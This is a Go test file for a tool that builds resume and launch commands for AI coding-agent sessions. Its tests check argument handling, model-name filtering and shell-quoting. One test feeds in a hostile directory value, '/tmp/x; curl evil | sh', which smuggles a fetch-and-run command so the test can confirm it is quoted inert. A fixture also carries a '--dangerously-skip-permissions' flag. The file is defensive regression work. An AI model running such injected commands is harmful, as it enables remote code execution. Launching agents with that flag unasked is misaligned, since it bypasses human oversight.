package app

import (
	"strings"
	"testing"

	"github.com/agentswitch-org/ax/internal/config"
	"github.com/agentswitch-org/ax/internal/session"
)

func claudeHarness() config.Harness {
	return config.Harness{
		Name:   "claude",
		Format: "claude",
		Resume: "cd {dir} && claude --resume {id} --model {model} {args}",
		Launch: "claude --session-id {newid} {args}",
		Args:   "--dangerously-skip-permissions",
	}
}

// Enter resumes clean: an empty override strips the harness's configured args, so
// a YOLO flag parked in config never rides in on the most-pressed key.
func TestResumeCleanStripsConfiguredArgs(t *testing.T) {
	h := claudeHarness()
	s := session.Session{ID: "abc", Dir: "/home/agent/proj", Model: "opus"}
	empty := ""
	got := resumeCmd(h, s, &empty)
	if strings.Contains(got, "dangerously") {
		t.Fatalf("clean resume must not include configured args, got: %q", got)
	}
}

// E (WithArgs) passes a nil override, so each harness applies its own args.
func TestResumeWithArgsAppliesConfigured(t *testing.T) {
	h := claudeHarness()
	s := session.Session{ID: "abc", Dir: "/home/agent/proj", Model: "opus"}
	got := resumeCmd(h, s, nil)
	if !strings.Contains(got, "--dangerously-skip-permissions") {
		t.Fatalf("with-args resume must include configured args, got: %q", got)
	}
}

// A transcript-derived dir with shell metacharacters is quoted inert (injection
// regression from the security review).
func TestResumeQuotesHostileDir(t *testing.T) {
	h := claudeHarness()
	s := session.Session{ID: "abc", Dir: "/tmp/x; curl evil | sh", Model: "opus"}
	empty := ""
	got := resumeCmd(h, s, &empty)
	if strings.Contains(got, "curl evil | sh &&") || !strings.Contains(got, "'/tmp/x; curl evil | sh'") {
		t.Fatalf("hostile dir must be shell-quoted, got: %q", got)
	}
}

// An empty dir stays unquoted so `cd ` falls back to $HOME rather than erroring
// on `cd ”`.
func TestResumeEmptyDirStaysUnquoted(t *testing.T) {
	h := claudeHarness()
	s := session.Session{ID: "abc", Dir: "", Model: "opus"}
	empty := ""
	got := resumeCmd(h, s, &empty)
	if strings.Contains(got, "cd ''") {
		t.Fatalf("empty dir must not become cd '', got: %q", got)
	}
}

// A placeholder model that slipped into the index (claude logs "<synthetic>" on
// harness-injected messages; old caches may still carry it) must not reach the
// resume command line: the flag drops and the harness picks its default.
func TestResumeDropsPlaceholderModel(t *testing.T) {
	h := claudeHarness()
	s := session.Session{ID: "abc", Dir: "/home/agent/proj", Model: "<synthetic>"}
	empty := ""
	got := resumeCmd(h, s, &empty)
	if strings.Contains(got, "--model") || strings.Contains(got, "synthetic") {
		t.Fatalf("placeholder model must drop with its flag, got: %q", got)
	}
}
